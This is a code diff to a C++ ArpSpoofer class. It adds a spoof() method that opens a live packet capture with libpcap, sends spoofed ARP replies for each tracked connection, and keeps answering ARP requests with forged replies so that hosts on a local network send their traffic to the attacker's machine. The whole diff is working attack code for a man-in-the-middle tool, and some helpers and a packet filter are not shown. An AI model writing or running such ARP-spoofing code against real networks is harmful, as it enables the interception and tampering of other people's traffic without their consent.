@@ -7,6 +7,7 @@
 #include <sys/socket.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <pcap.h>
 
 #include <stdio.h>
 
@@ -20,6 +21,39 @@ bool ArpSpoofer::addConnection(const ArpConnection& connection) {
 
   connections.push_back(connection);
   return true;
+}
+
+void ArpSpoofer::spoof(uint64_t spoofAddr) {
+  spoofing = true;
+  for(auto itr = connections.begin(); itr != connections.end(); ++itr) {
+    (*itr).spoof(spoofAddr);
+  }
+
+  pcap_t* handle = pcap_open_live(interfaceName.c_str(), 1500, 0, 2000, NULL);
+
+  //TODO: add filter to handle
+
+  const u_char* packet;
+  struct pcap_pkthdr header;
+
+  while(spoofing) {
+    packet = pcap_next(handle, &header);
+    struct etherhdr* eth_header = (struct etherhdr*) packet;
+
+    if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
+      ARPPacket arpPacket(packet);
+      //if packet is arp request...
+      if(arpPacket.getOperation() == ARPPacket::Operation::request) {
+	for(auto itr = connections.begin(); itr != connections.end(); ++itr) {
+	  (*itr).spoofBack(packet, spoofAddr);
+	}
+      }
+    }
+  }
+}
+
+void ArpSpoofer::setSpoofing(bool pSpoofing) {
+  spoofing = pSpoofing;
 }
 
 uint64_t ArpSpoofer::getMacForInterface(std::string ifName) {
